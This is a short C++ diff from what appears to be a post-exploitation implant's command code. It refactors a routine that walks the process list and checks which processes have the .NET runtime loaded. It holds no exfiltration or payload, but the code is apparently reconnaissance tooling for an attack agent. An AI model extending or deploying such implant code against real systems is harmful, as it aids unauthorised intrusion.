@@ -134,10 +134,11 @@ namespace Commands {
         ICLRMetaHost    *meta       = { };
         ICLRRuntimeInfo *runtime    = { };
 
-        DWORD type  = Parser::UnpackDword(parser); // listing managed/un-managed processes
-        DWORD size  = 0;
-
         WCHAR buffer[1024];
+
+        DWORD size  = 0;
+        DWORD type  = Parser::UnpackDword(parser);
+
 
         size            = ARRAY_LEN(buffer);
         entries.dwSize  = sizeof(PROCESSENTRY32);
@@ -146,8 +147,8 @@ namespace Commands {
         x_assert(Ctx->win32.Process32First(snapshot, &entries));
 
         do {
-            BOOL is_managed  = false;
-            BOOL is_loaded   = false;
+            bool is_managed  = false;
+            bool is_loaded   = false;
 
             CLIENT_ID           cid     = { };
             OBJECT_ATTRIBUTES   attr    = { };
@@ -156,10 +157,8 @@ namespace Commands {
             cid.UniqueProcess   = (HANDLE) entries.th32ProcessID;
 
             InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
-            if (!NT_SUCCESS(Ctx->nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid))) {
-                continue;
-            }
 
+            x_ntassert(Ctx->nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid));
             x_ntassert(Ctx->nt.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, (void**) &meta));
             x_ntassert(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums));
 
